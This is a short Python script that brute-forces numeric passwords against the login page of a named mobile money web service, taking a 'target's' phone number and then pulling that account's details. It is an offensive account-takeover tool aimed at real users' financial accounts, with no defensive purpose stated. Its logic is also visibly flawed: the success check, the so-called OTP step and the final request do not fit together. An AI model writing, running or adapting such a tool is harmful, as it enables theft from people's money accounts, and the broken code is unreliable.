import requests

def get_headers():
  response = requests.get('https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml', headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9'})
  headers = response.headers
  return headers

def get_password(username):
  for i in range(100000):
    params = {'loginForm': 'loginForm', 'loginForm[username]': username, 'loginForm[password]': i, 'loginForm[j_idt19]': 'Login', 'javax.faces.ViewState': '1319890406535641868:-8273346397217720005'}
    response = requests.post('https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml', headers=get_headers(), data=params)
    if response.text == 'j_security_check':
      return i

def get_otp(username, password):
  params = {'loginForm': 'loginForm', 'loginForm[username]': username, 'loginForm[password]': password, 'loginForm[j_idt19]': 'Login', 'javax.faces.ViewState': '1319890406535641868:-8273346397217720005'}
  response = requests.post('https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml', headers=get_headers(), data=params)
  if response.text == 'j_security_check':
    return response.text

def get_account_details(username, password, otp):
  response = requests.get('https://mobilemoney.mtncameroon.net/MoMoWebAppMTNCameroon/pages/selectedaccountdeatils.xhtml', headers=get_headers())
  return response.text

def main():
  username = input('Enter the Targets Phonenumber: ')
  password = get_password(username)
  otp = get_otp(username, password)
  account_details = get_account_details(username, password, otp)
  print(account_details)

if __name__ == '__main__':
  main()
